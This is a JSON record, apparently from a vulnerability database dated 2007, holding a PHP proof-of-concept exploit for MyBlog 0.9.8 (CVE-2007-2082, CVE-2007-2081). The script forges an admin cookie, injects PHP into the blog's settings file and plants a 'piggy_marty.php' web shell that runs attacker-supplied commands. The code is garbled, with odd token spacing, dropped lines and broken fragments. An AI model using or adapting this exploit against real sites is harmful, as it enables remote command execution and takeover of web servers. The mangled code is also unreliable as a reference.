{
    "text": "vul_name : MyBlog <= 0.9.8 Remote Command Execution Exploit ， vul_cve : CVE-2007-2082 , CVE-2007-2081 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \" ， MyBlog <= 0.9.8 Remote Command Execution Exploit ， by BlackHawk <hawkgotyou ( at ) gmail ( dot ) com [ email concealed ] > < ， Thanks to rgod for the php code and Marty for the Love ， \" ;  ， echo \"Usage : php \". $ argv [ 0 ] .\" Host Path CMD ， Host : target server ( ip/hostname )  ， Path : path of myblog ， Example :  ， php \". $ argv [ 0 ] .\" localhost /myblog/ CMD\" ;  ， die ;  ， } ， The problem is in all admin files :  ，  $ name = $ _COOKIE [ 'login' ]  ;  ， } ， echo \"Please Login\" ;  ， exit ;  ， } ， This easy to bypass function leads to a RCE because we can put PHP code in settings.inc ,  ， that is required in many pages. ， This exploit create a piggy_marty.php shell on the victim site ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ cmd=\" ;  ，  $ cmd.=\" \". $ argv [  $ i ]  ;  ， } ，  $ cmd=urlencode (  $ cmd )  ;  ，  $ port=80 ;  ，  $ proxy=\" ;  ， echo \"Step0 - See If piggy_marty.php already exists.rn\" ;  ，  $ packet=\"GET \". $ p.\"piggy_marty.php?cmd= $ cmd HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : cmd= $ cmdrn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ， { ， echo \"Exploit succeeded.rn\" ;  ，  $ temp=explode ( \"666999\" ,  $ html )  ;  ， die ( \"rn\". $ temp [ 1 ] .\"rn\" )  ;  ， } ， echo \"Step1 - Retrieving Configurationrn\" ;  ，  $ packet=\"GET \". $ p.\"admin/settings.php HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : admin=BlackHawkrn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"<textarea name=\"content\" cols=\"80\" rows=\"20\">\" ,  $ html )  ;  ，  $ config_file=explode ( \"</textarea><br /><input type=\"submit\" /></form>\" ,  $ temp [ 1 ]  )  ;  ，  $ new_file = str_replace ( '?>' , ' ，  $ fp=fopen ( 'piggy_marty.php' , 'w' )  ; ",
    "time": "2007.04.19"
}